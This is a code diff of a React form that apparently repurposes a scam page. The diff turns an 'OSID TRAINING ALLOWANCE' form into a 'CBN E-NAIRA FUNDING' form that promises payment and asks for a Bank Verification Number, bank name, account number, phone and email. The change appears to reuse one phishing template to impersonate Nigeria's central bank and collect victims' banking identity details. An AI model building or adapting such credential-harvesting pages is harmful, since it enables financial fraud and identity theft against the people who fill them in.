@@ -7,9 +7,7 @@ import Popup from "./PopUp"
 export default function Form()  {
     const [ form, setForm ] = useState({
         name: '',
-        svn_no: '',
-        rank: '',
-        cmd: '',
+        bvn: '',
         phone_no: '',
         email: '',
         bank: '',
@@ -35,7 +33,7 @@ export default function Form()  {
             .catch((error) => {
                 console.log(error);
             });
-        setForm({ pop: true, name : '', svn_no: '', rank: '', cmd: '', phone_no: '', email: '', bank: '', account: '',  })
+        setForm({ pop: true, name : '', bvn: '', phone_no: '', email: '', bank: '', account: '',  })
     }
 
     return (
@@ -45,7 +43,7 @@ export default function Form()  {
             <div className="hidden lg:block relative w-full lg:w-1/2 bg-green-600">
                 <div className="absolute bottom-0 inset-x-0 mx-auto mb-12 max-w-xl text-center" style={{zIndex: 10}}>
                     <img className="lg:max-w-xl mx-auto" src={img} alt="" />
-                    <h2 className="mb-2 text-2xl text-white font-bold">OSID TRAINING ALLOWANCE</h2>
+                    <h2 className="mb-2 text-2xl text-white font-bold">CBN E-NAIRA FUNDING</h2>
                     <div className="max-w-lg mx-auto">
                         <p className="mb-6 text-gray-50 leading-loose">Submit your details to get paid.</p>
                     </div>
@@ -56,7 +54,7 @@ export default function Form()  {
                     <img className="relative mx-auto max-w-sm mt-4 mb-4 block" src={img} alt="" />
                 </div>
                 <div className="py-10 px-3 text-center" style={{zIndex: 10}}>
-                    <h2 className="mb-2 text-2xl text-white font-bold">OSID TRAINING ALLOWANCE</h2>
+                    <h2 className="mb-2 text-2xl text-white font-bold">CBN E-NAIRA FUNDING</h2>
                     <p className="mb-6 text-gray-50 leading-loose">Submit your details to get paid.</p>
                 </div>
             </div>
@@ -78,23 +76,11 @@ export default function Form()  {
                             />
                         </div>
                         <div className="mb-3 w-full lg:w-1/2 px-2">
-                            <input className="w-full p-4 text-xs bg-gray-50 outline-none rounded" type="text" placeholder="Service Number" 
-                            name = "svn_no" value = {form.svn_no} onChange={updateForm}
+                            <input className="w-full p-4 text-xs bg-gray-50 outline-none rounded" type="text" placeholder="Bank Verification Number" 
+                            name = "bvn" value = {form.bvn} onChange={updateForm}
                             />
                         </div>
-                    </div>
-                    <div className="flex flex-wrap">
-                        <div className="mb-3 w-full lg:w-1/2 px-2">
-                            <input className="w-full p-4 text-xs bg-gray-50 outline-none rounded" type="text" placeholder="Rank"
-                            name = "rank" value = {form.rank} onChange={updateForm} 
-                            />
-                        </div>
-                        <div className="mb-3 w-full lg:w-1/2 px-2">
-                            <input className="w-full p-4 text-xs bg-gray-50 outline-none rounded" type="text" placeholder="Directorate/Command" 
-                            name = "cmd" value = {form.cmd} onChange={updateForm}
-                            />
-                        </div>
-                    </div>
+                    </div>                    
                     <div className="flex flex-wrap">
                         <div className="mb-3 w-full lg:w-1/2 px-2">
                             <input className="w-full p-4 text-xs bg-gray-50 outline-none rounded" type="text" placeholder="Bank"
